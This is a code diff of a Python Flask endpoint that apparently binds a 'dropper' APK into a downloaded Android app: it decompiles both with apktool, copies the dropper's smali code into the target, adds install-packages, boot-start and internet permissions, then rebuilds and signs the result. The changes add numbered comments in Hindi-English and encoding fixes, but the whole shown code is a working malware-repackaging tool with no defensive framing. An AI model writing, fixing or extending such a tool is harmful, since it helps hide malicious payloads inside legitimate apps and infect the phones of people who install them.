@@ -30,7 +30,7 @@ def inject():
 
         target = os.path.join(WORK, "target.apk")
         
-        # Download
+        # 1. Download APK
         response = requests.get(file_url, stream=True, timeout=60)
         if response.status_code != 200:
             return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
@@ -42,48 +42,50 @@ def inject():
         if not zipfile.is_zipfile(target):
             return jsonify({"error": "Downloaded file is not a valid APK"}), 400
 
-        # Target decompile
+        # 2. Target APK decompile (-r flag taaki crash na ho)
         target_dir = os.path.join(WORK, "target_dir")
         shutil.rmtree(target_dir, ignore_errors=True)
         res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500
 
-        # Check karo ki manifest file hai ya folder
+        # 3. Check karo ki manifest file hai ya folder
         manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
         if os.path.isdir(manifest_path):
             return jsonify({"error": "Target APK ka structure kharab hai. AndroidManifest.xml ek folder ban gaya hai."}), 500
 
-        # Dropper decompile
+        # 4. Dropper APK decompile
         dropper_dir = os.path.join(WORK, "dropper_dir")
         shutil.rmtree(dropper_dir, ignore_errors=True)
         res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool dropper fail: {res.stderr[:200]}"}), 500
 
-        # Smali copy
+        # 5. Smali copy
         src = os.path.join(dropper_dir, "smali")
         dst = os.path.join(target_dir, "smali")
         if os.path.exists(src):
             shutil.copytree(src, dst, dirs_exist_ok=True)
 
-        # Manifest merge
-        with open(manifest_path) as f:
+        # 6. Manifest merge (UTF-8 error fix ke sath)
+        with open(manifest_path, 'r', encoding='utf-8', errors='ignore') as f:
             t = f.read()
+            
         perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK"]
         insert = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
         if insert:
             t = t.replace("</application>", insert + "</application>")
-        with open(manifest_path, "w") as f:
+            
+        with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(t)
 
-        # Build
+        # 7. Build
         unsigned = os.path.join(WORK, "unsigned.apk")
         res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool build fail: {res.stderr[:200]}"}), 500
 
-        # Sign
+        # 8. Sign
         aligned = os.path.join(WORK, "aligned.apk")
         signed = os.path.join(WORK, "signed.apk")
         subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
